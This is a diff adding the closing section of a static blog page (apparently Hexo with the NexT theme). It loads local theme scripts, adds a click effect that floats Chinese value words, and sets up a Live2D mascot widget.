+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
